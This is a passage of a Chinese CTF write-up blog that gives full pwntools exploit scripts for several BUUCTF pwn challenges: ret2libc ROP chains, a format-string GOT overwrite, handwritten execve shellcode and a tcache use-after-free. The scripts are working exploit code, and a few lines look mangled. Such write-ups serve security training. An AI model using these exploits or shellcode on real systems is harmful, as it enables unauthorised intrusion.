class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a>axb_2019_brop64</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>ret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;axb_2019_brop64&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">    func = <span class="number">0x400845</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(func)</span><br><span class="line">    sd(payload)</span><br><span class="line">    leak = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    echo(<span class="string">&quot;/bin/sh:&quot;</span> + <span class="built_in">hex</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()))</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(libc.sym[<span class="string">&quot;system&quot;</span>]) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29520</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print axb_2019_brop64&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h2><p>（易）考点：</p><ul><li>循环32位格式化字符串</li></ul><p>pwntools一把梭</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./wdb_2018_2nd_easyfmt.1&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&quot;../libc-2.23_32.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Do you know repeater?&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%35$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base = <span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leak：&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&quot;printf&quot;</span>]:leak + libc.sym[<span class="string">&quot;system&quot;</span>]&#125;)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27749</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="x-ctf-b0verfl0w"><a href="#x-ctf-b0verfl0w" class="headerlink" title="x_ctf_b0verfl0w"></a>x_ctf_b0verfl0w</h2><p>（较易）考点：</p><ul><li>手写shellcode</li><li>栈溢出</li></ul><p>有个hint函数，里面有条jmp esp指令</p><p>栈空间太小，需要手写shellcode，然后ret地址改为jmp esp的gadget（开RWX了）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./b0verfl0w&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push 0x68732f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov al,0xB</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    echo(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x24</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    payload += p32(<span class="number">0x8048504</span>) + asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26603</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>（易）考点：</p><ul><li>栈溢出，ret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;&gt;&gt; 6. Exit&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input the name of fruit:&quot;</span>)</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    sl(payload)</span><br><span class="line">    libc = ELF(<span class="string">&quot;../libc-2.23_32.so&quot;</span>)</span><br><span class="line">    leak = uu32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(leak + libc.sym[<span class="string">&quot;system&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(leak + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__())</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26780</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h2><p>（难）考点：</p><ul><li>文件描述符</li><li>uaf</li></ul><p>总结：dup2函数，修改<em>IO_2_1_stdin</em>结构体中的文件描述符字段（输入为0，配合dup2函数泄露flag文件），旧版libc2.27无edit的uaf，bss没有heaparray只有heapptr的时候用uaf一块tcache，然后改next指针来做处理，虽然没edit但是可以add后改（本身指向的就是自己）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk = show(<span class="number">2</span>) - <span class="number">0xa0</span></span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    stdin_fileno = ((show(<span class="number">1</span>) - <span class="number">96</span> - <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) - (libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]) + <span class="number">0x70</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, stdin_fileno)</span><br><span class="line">    chunk = show(<span class="number">1</span>) + <span class="number">0x30</span></span><br><span class="line">    add(<span class="number">1</span>, chunk)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    edit(<span class="string">&quot;flag出来吧&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29350</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;which command?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">choice, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">    sa(<span class="string">&quot;your inode number:&quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    ru(<span class="string">&quot;what do you want to say at last?&quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">show_type</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(show_type))</span><br><span class="line">    <span class="keyword">if</span> show_type == <span class="number">1</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> show_type == <span class="number">2</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./ciscn_final&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16_2</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> 